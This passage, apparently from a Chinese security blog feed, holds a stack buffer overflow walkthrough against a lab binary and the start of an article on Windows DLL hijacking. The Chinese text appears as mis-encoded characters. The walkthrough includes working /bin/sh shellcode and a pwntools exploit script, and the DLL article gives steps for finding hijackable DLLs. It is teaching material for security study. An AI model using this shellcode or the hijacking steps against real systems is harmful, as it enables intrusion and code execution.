(0xf7f90000)</span><br></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰ä»»ä½•ä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ€è·¯åªéœ€è¦ç¡®å®šå­—ç¬¦ä¸²å¤§å°ã€è¿”å›åœ°å€ã€è¿˜æœ‰shellcodeï¼Œç„¶åæ‹¼æ¥èµ·æ¥å³å¯ï¼Œæ‹¼æ¥çš„åŸç†æœ‰ä¸¤ç§æ–¹æ³•</p><ul><li>æ–¹æ³•1ï¼šæŠŠshellcodeå†™åœ¨å‡½æ•°çš„æ ˆå¸§é‡Œ, ä½†å…¶å¤§å°æœ‰é™</li><li>æ–¹æ³•2ï¼šæŠŠshellcodeå†™åœ¨è°ƒç”¨è€…(main)çš„æ ˆå¸§é‡Œ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•1ï¼š                               æ–¹æ³•2ï¼š</span><br><span class="line">     Stack                                   Stack</span><br><span class="line">+------------------+       ä½åœ°å€          +------------------+ </span><br><span class="line">|    shellcode     |         ^            | &quot;AAAAAAAAAAAAAA&quot; |</span><br><span class="line">+------------------+         |            +------------------+ </span><br><span class="line">| &quot;AAAAAAAAAAAAAA&quot; |         |            |       ret        |</span><br><span class="line">+------------------+         |            +------------------+ </span><br><span class="line">|        ret       |         |            |    shellcode     |</span><br><span class="line">+------------------+       é«˜åœ°å€          +------------------+ </span><br></pre></td></tr></table></figure><hr><h5 id="æ‰¾å‡ºæº¢å‡ºå€¼"><a href="#æ‰¾å‡ºæº¢å‡ºå€¼" class="headerlink" title="æ‰¾å‡ºæº¢å‡ºå€¼"></a>æ‰¾å‡ºæº¢å‡ºå€¼</h5><p>é¦–å…ˆå¼€å§‹ç¡®å®šç¨‹åºæº¢å‡ºçš„å­—ç¬¦ä¸²å¤§å°ï¼Œæˆ‘ä»¬å…ˆåˆ›å»º200ä¸ªå­—ç¬¦</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>è¿è¡Œåç¨‹åºå¥”æºƒï¼ŒEIPè¢«è¦†ç›–äº†ï¼Œæ˜¾ç¤ºé”™è¯¯å€¼ä¸º<code>0x6261616b(kkab)</code></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/8.png" alt="image-20201117143016927"></p><p>ç„¶åæˆ‘ä»¬ç”¨cyclicå°±èƒ½çœ‹åˆ°æº¢å‡ºçš„å­—ç¬¦ä¸²å¤§å°äº†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><hr><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>æ¥ç€åˆ¶ä½œä¸€ä¸ªshellcodeï¼Œç›´æ¥ä½¿ç”¨æ±‡ç¼–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; shellcode.asm</span><br><span class="line">; execve (&quot;&#x2F;bin&#x2F;sh&quot;) æ±‡ç¼–åŸå½¢</span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax        ;&quot;\x00&quot;</span><br><span class="line">push 0x68732f2f ;&quot;&#x2F;&#x2F;sh&quot; å…¥æ ˆ</span><br><span class="line">push 0x6e69622f ;&quot;&#x2F;bin&quot; å…¥æ ˆ</span><br><span class="line">mov ebx, esp    ;ebx&#x3D;esp &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;çš„åœ°å€</span><br><span class="line">push eax        ;&quot;\x00&quot; å…¥æ ˆ</span><br><span class="line">push ebx        ;&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;åœ°å€å…¥æ ˆ</span><br><span class="line">mov ecx, esp    ;ecx&#x3D;esp  ä¸ºæŒ‡é’ˆæ•°ç»„åœ°å€</span><br><span class="line">xor edx, edx    ;edx&#x3D;0</span><br><span class="line">mov al, 11      ;al&#x3D;11   execveçš„ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">int 0x80        ;è½¯ä¸­æ–­æŒ‡ä»¤</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸ç¡®å®šæ±‡ç¼–èƒ½ä¸èƒ½ç”¨å¯ä»¥ç¼–è¯‘ç„¶åè¿è¡Œè¯•è¯•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellcode.asm</span><br><span class="line">ld -m elf_i386 -o shellcode shellcode.o <span class="comment">#ç¼–è¯‘çš„æ˜¯32ä½çš„æ±‡ç¼–</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/9.png" alt="image-20201117203411240"></p><p>æ¥ç€æˆ‘ä»¬è¦æŠŠæ±‡ç¼–ä»£ç è½¬æ¢æˆSHELLCODEï¼Œæœ‰å¥½å‡ ç§æ–¹æ³•ï¼Œè¿™è¾¹å°±æä¸‰ç§</p><ul><li><p>ä½¿ç”¨rasm2æŠŠæ±‡ç¼–ä»£ç è½¬æ¢ä¸ºCçš„shellcodeï¼Œè½¬æ¢çš„æ—¶å€™åªéœ€è¦shellcode.asmæ–‡ä»¶<code>_start:</code>åé¢çš„å†…å®¹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># rasm2 -a x86 -b 32 -f shellcode.asm -C</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨pwntoolsè¿›è¡Œè½¬æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shellcode.py</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">pwn.context.arch      = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">pwn.context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">pwn.context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">pwn.context.word_size = <span class="number">32</span></span><br><span class="line">shellcode = pwn.asm(<span class="string">&quot;xor eax, eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x68732f2f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push 0x6e69622f&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ebx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push eax&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;push ebx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov ecx, esp&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;xor edx, edx&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;mov al, 11&quot;</span>)</span><br><span class="line">shellcode += pwn.asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">print(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>è¿è¡ŒPythonè„šæœ¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># python3 shellcode.py</span></span><br><span class="line">31c050682f2f7368682f62696e89e3505389e131d2b00bcd80</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨pwntoolså†…ç½®çš„æ±‡ç¼–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(shellcode)</span><br></pre></td></tr></table></figure></li></ul><hr><h5 id="å¯»æ‰¾è¿”å›åœ°å€"><a href="#å¯»æ‰¾è¿”å›åœ°å€" class="headerlink" title="å¯»æ‰¾è¿”å›åœ°å€"></a>å¯»æ‰¾è¿”å›åœ°å€</h5><p>ç”±äºgdbçš„è°ƒè¯•ç¯å¢ƒä¼šå½±å“<strong>buf</strong>åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œè™½ç„¶æˆ‘ä»¬å…³é—­äº†ASLRï¼Œä½†è¿™åªèƒ½ä¿è¯bufçš„åœ°å€åœ¨gdbçš„è°ƒè¯•ç¯å¢ƒä¸­ä¸å˜ï¼Œä½†å½“æˆ‘ä»¬ç›´æ¥æ‰§è¡Œ<code>./level1</code>çš„æ—¶å€™ï¼Œ<strong>buf</strong>çš„ä½ç½®ä¼šå›ºå®šåœ¨åˆ«çš„åœ°å€ä¸Šã€‚</p><p>æ‰€ä»¥éœ€è¦å¼€å¯core dumpåŠŸèƒ½ï¼Œå½“å‡ºç°å†…å­˜é”™è¯¯çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªcore dumpæ–‡ä»¶åœ¨tmpç›®å½•ä¸‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/core_uses_pid</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/corefiles/core-%e-%p-%t&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€è¿›è¡Œè°ƒè¯•</p><p><strong>æ³¨æ„ï¼šå¦‚æœé‡å¯æœºå™¨å…³é—­çš„ASLRæˆ–è€…å¼€å¯çš„core dumpéƒ½ä¼šå…³é—­äº†</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ ./level1 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">æ®µé”™è¯¯ (æ ¸å¿ƒå·²è½¬å‚¨)</span><br><span class="line">kali@kali:~/Desktop/Pwn$ gdb ./level1 /tmp/core.1605753112.1826 </span><br><span class="line">Core was generated by `./level1<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">#0  0x41416d41 in ?? ()</span></span><br><span class="line"><span class="string">gdb-peda$ pattern offset 0x41416d41</span></span><br><span class="line"><span class="string">1094806849 found at offset: 140</span></span><br><span class="line"><span class="string">gdb-peda$ x/10s $esp-144</span></span><br><span class="line"><span class="string">0xffffd190:     &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...</span></span><br><span class="line"><span class="string">0xffffd225:     &quot;\n\264\374&quot;, &lt;incomplete sequence \367&gt;</span></span><br><span class="line"><span class="string">0xffffd226:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd227:     &quot;\373\367\001&quot;</span></span><br><span class="line"><span class="string">0xffffd228:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd229:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22a:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22b:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd22c:     &quot;&quot;</span></span><br><span class="line"><span class="string">0xffffd231:     &quot;&quot;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæº¢å‡ºç‚¹æ˜¯140ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Š4ä¸ªå­—èŠ‚çš„retåœ°å€ï¼Œé€šè¿‡gdbçš„å‘½ä»¤<code>x/10s $esp-144</code>ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°bufçš„åœ°å€ä¸º<strong>0xffffd190</strong>ï¼Œç„¶ååˆ©ç”¨è„šæœ¬å³å¯è¾¾åˆ°æº¢å‡ºæ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/10.png" alt="image-20201119104715107"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd190</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span> </span><br><span class="line">shellcode+= <span class="string">b&quot;\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">payload = shellcode + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">140</span>-<span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>å‘ç‚¹</p></blockquote><p>ç”¨kaliè°ƒè¯•å¥½åƒæ˜¯æœ‰é—®é¢˜çš„ï¼Œæº¢å‡ºçš„retåœ°å€ç»å¸¸ä¸å¯¹ï¼Œæœ€å¥½ç”¨Ubuntuï¼Œç«‹é©¬åˆ Kaliï¼ï¼</p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;introspelliam.github.io&#x2F;2017&#x2F;09&#x2F;30&#x2F;linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183370</span><br><span class="line">http:&#x2F;&#x2F;www.peckerwood.top&#x2F;post&#x2F;rop_0x01&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;blog.nsfocus.net&#x2F;easy-implement-shellcode-xiangjie&#x2F;</span><br><span class="line">ã€ŠCTFç«èµ›æƒå¨æŒ‡å—ã€‹</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ¶æ„ç¨‹åºç ”ç©¶ä¹‹DLLåŠ«æŒ</title>
    <link href="https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/"/>
    <id>https://www.ascotbe.com/2020/11/13/DynamicLinkLibraryHijack/</id>
    <published>2020-11-13T07:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.389Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><h2 id="DLLåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h2><p>DLLåŠ«æŒä¸€ç›´æ·±å—é»‘å®¢ä»¬çš„å–œæ¬¢ï¼Œåˆ©ç”¨æ­¤æŠ€æœ¯å¯ä»¥å®ç°å¯åŠ¨æœ¨é©¬åé—¨ï¼Œæ¸¸æˆå¤–æŒ‚æ’ä»¶çš„æ³¨å…¥ï¼Œç»•è¿‡UACç­‰æ“ä½œã€‚</p><p>å…¨æ–‡çº¦å®šï¼šå…¨æ–‡ä¸­ç³»ç»Ÿç›˜æ‰€åœ¨çš„ä½ç½®é»˜è®¤ä¸ºCç›˜</p><h2 id="DLLåŠ è½½é¡ºåº"><a href="#DLLåŠ è½½é¡ºåº" class="headerlink" title="DLLåŠ è½½é¡ºåº"></a>DLLåŠ è½½é¡ºåº</h2><p>DLLæ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨åœ¨ç¡¬ç›˜ä¸­ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºåˆæ˜¯å¦‚ä½•ç´¢å¼•æ‰€éœ€çš„DLLå‘¢ï¼Ÿå…¶å®ï¼ŒMicrosoftå·²åœ¨<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">æ­¤å¤„</a>å®Œæ•´è®°å½•äº†DLLæœç´¢é¡ºåºã€‚</p><blockquote><p>å¾®è½¯çš„DLLåŠ«æŒåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ</p></blockquote><ul><li>æ— ä¿æŠ¤é˜¶æ®µï¼šWindows XP SP2ä¹‹å‰</li><li>ä¿æŠ¤é˜¶æ®µï¼šWindows XP SP2ä¹‹åï¼ŒWindows 7ä¹‹å‰</li><li>è¿›ä¸€æ­¥ä¿æŠ¤é˜¶æ®µï¼šWindows 7ä¹‹å</li></ul><blockquote><h4 id="Windows-XP-SP2ä¹‹å‰"><a href="#Windows-XP-SP2ä¹‹å‰" class="headerlink" title="Windows XP SP2ä¹‹å‰"></a>Windows XP SP2ä¹‹å‰</h4></blockquote><ol><li>è¿›ç¨‹å¯¹åº”çš„åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½•ï¼›</li><li>åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰ç›®å½•ï¼›</li><li>ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•ï¼ˆé€šè¿‡ GetSystemDirectory è·å–ï¼‰ï¼›</li><li>16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•ï¼›</li><li>Windowsç›®å½•ï¼ˆé€šè¿‡ GetWindowsDirectory è·å–ï¼‰ï¼›</li><li>PATHç¯å¢ƒå˜é‡ä¸­çš„å„ä¸ªç›®å½•ï¼›</li></ol><blockquote><h4 id="Windows-XP-SP2ä¹‹å"><a href="#Windows-XP-SP2ä¹‹å" class="headerlink" title="Windows XP SP2ä¹‹å"></a>Windows XP SP2ä¹‹å</h4></blockquote><p>å¾®è½¯ä¸ºäº†é˜²æ­¢DLLåŠ«æŒæ¼æ´çš„äº§ç”Ÿï¼Œåœ¨XP SP2ä¹‹åï¼Œæ·»åŠ äº†ä¸€ä¸ªSafeDllSearchModeçš„æ³¨å†Œè¡¨å±æ€§ã€‚æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</span><br></pre></td></tr></table></figure><p>å½“SafeDllSearchModeçš„å€¼è®¾ç½®ä¸º1ï¼Œå³å®‰å…¨DLLæœç´¢æ¨¡å¼å¼€å¯æ—¶ï¼ŒæŸ¥æ‰¾DLLçš„ç›®å½•é¡ºåºå¦‚ä¸‹ï¼š</p><ol><li>åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½•ï¼›</li><li>ç³»ç»Ÿç›®å½•SYSTEM32 ç›®å½•ï¼›</li><li>16ä½ç³»ç»Ÿç›®å½•å³SYSTEM ç›®å½•ã€‚è¯¥é¡¹åªæ˜¯ä¸ºäº†å‘å‰å…¼å®¹çš„å¤„ç†ï¼Œå¯ä»¥ä¸è€ƒè™‘ï¼›</li><li>Windowsç›®å½•ã€‚é€šå¸¸æ˜¯<strong>C:\Windows</strong>ï¼›</li><li>åŠ è½½ DLL æ—¶æ‰€åœ¨çš„å½“å‰ç›®å½•ï¼›</li><li>ç¯å¢ƒå˜é‡<strong>PATH</strong>ä¸­æ‰€æœ‰ç›®å½•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¸åŒ…æ‹¬<strong>App Paths</strong>æ³¨å†Œè¡¨é¡¹æŒ‡å®šçš„åº”ç”¨ç¨‹åºè·¯å¾„ã€‚</li></ol><p><strong>PSï¼š</strong>â€œå®‰å…¨DLLæŸ¥æ‰¾æ¨¡å¼â€é»˜è®¤æ˜¯å¯ç”¨çš„</p><blockquote><h4 id="Windows-7ä¹‹å"><a href="#Windows-7ä¹‹å" class="headerlink" title="Windows 7ä¹‹å"></a>Windows 7ä¹‹å</h4></blockquote><p>å¾®è½¯ä¸ºäº†æ›´è¿›ä¸€æ­¥çš„é˜²å¾¡ç³»ç»Ÿçš„DLLè¢«åŠ«æŒï¼Œå°†ä¸€äº›å®¹æ˜“è¢«åŠ«æŒçš„ç³»ç»ŸDLLå†™è¿›äº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ä¸­ï¼Œ<strong>é‚£ä¹ˆå‡¡æ˜¯æ­¤é¡¹ä¸‹çš„DLLæ–‡ä»¶å°±ä¼šè¢«ç¦æ­¢ä»EXEè‡ªèº«æ‰€åœ¨çš„ç›®å½•ä¸‹è°ƒç”¨</strong>ï¼Œè€Œåªèƒ½ä»ç³»ç»Ÿç›®å½•å³SYSTEM32ç›®å½•ä¸‹è°ƒç”¨ã€‚æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span><br></pre></td></tr></table></figure><p>Windows 10ä¸­çš„å¦‚ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/DynamicLinkLibraryHijack/1.png" alt="image-20200921151524382"></p><h2 id="å¦‚ä½•å¯»æ‰¾DLLåŠ«æŒ"><a href="#å¦‚ä½•å¯»æ‰¾DLLåŠ«æŒ" class="headerlink" title="å¦‚ä½•å¯»æ‰¾DLLåŠ«æŒ"></a>å¦‚ä½•å¯»æ‰¾DLLåŠ«æŒ</h2><blockquote><p>åŠ«æŒç³»ç»ŸDLL</p></blockquote><p>è¦åˆ†æä¸€ä¸ªåº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨åŠ«æŒç³»ç»ŸDLLçš„æ¼æ´ï¼Œéœ€è¦è¿™ä¹ˆå‡ ä¸ªæ­¥éª¤</p><ul><li>å¯åŠ¨åº”ç”¨ç¨‹åº</li><li>ä½¿ç”¨Process Explorerç­‰ç±»ä¼¼è½¯ä»¶æŸ¥çœ‹è¯¥åº”ç”¨ç¨‹åºå¯åŠ¨ååŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚</li><li>ä»è¯¥åº”ç”¨ç¨‹åºå·²ç»åŠ è½½çš„DLLåˆ—è¡¨ä¸­ï¼ŒæŸ¥æ‰¾åœ¨ä¸Šè¿°â€œKnownDLLsæ³¨å†Œè¡¨é¡¹â€ä¸­ä¸å­˜åœ¨çš„DLLã€‚</li><li>ç¼–å†™ä»ä¸Šä¸€æ­¥è·å–åˆ°çš„DLLçš„åŠ«æŒDLLã€‚</li><li>å°†ç¼–å†™å¥½çš„åŠ«æŒDLLæ”¾åˆ°è¯¥åº”ç”¨ç¨‹åºç›®å½•ä¸‹ï¼Œé‡æ–°å¯åŠ¨è¯¥åº”ç”¨ç¨‹åºï¼Œæ£€æµ‹æ˜¯å¦åŠ«æŒæˆåŠŸã€‚</li></ul><p>å¦‚æœå¯¹ä»¥ä¸Šæ­¥éª¤éƒ½æ²¡é—®é¢˜è¿˜æ˜¯æ²¡æœ‰å®ç°åŠ«æŒçš„è¯ï¼Œå…·ä½“å¯èƒ½æœ‰ä¸€ä¸‹æƒ…å†µ</p><ul><li>DLLä¸åœ¨KnownDLLsæ³¨å†Œè¡¨ä¸­ä½†æ˜¯å·²ç»è¢«å¾®è½¯åšäº†ä¿æŠ¤ï¼Œæ¯”å¦‚ntdll.dllç­‰ç³»ç»Ÿæ ¸å¿ƒdll</li><li>å®¿ä¸»è¿›ç¨‹åœ¨è°ƒç”¨LoadLibraryå‡½æ•°æ—¶ä½¿ç”¨äº†â€œç»å¯¹è·¯å¾„â€</li><li>å®¿ä¸»è¿›ç¨‹å¯¹è°ƒç”¨çš„DLLè¿›è¡Œäº†æ ¡æ£€ï¼Œæ¯”å¦‚æ–‡ä»¶MD5ã€HASHç­‰å€¼</li><li>å®¿ä¸»è°ƒç”¨DLLæ—¶ä½¿ç”¨äº†SetDllDirectoryå‡½æ•°æŠŠå½“å‰ç›®å½•ä»DLLçš„æœç´¢é¡ºåºåˆ—è¡¨ä¸­åˆ é™¤</li></ul><blockquote><p>åŠ«æŒåº”ç”¨DLL</p></blockquote><p>åŠ«æŒè¿™ä¸ªDLLå°±æ–¹ä¾¿å¤šäº†ï¼Œåªè¦å®¿ä¸»æ²¡æœ‰å¯¹è‡ªå·±çš„DLLåšæ ¡æ£€çš„è¯å°±å¯ä»¥è¿›è¡ŒåŠ«æŒæ›¿æ¢</p><h2 id="æ‰‹åŠ¨å¯»æ‰¾"><a href="#æ‰‹åŠ¨å¯»æ‰¾" class="headerlink" 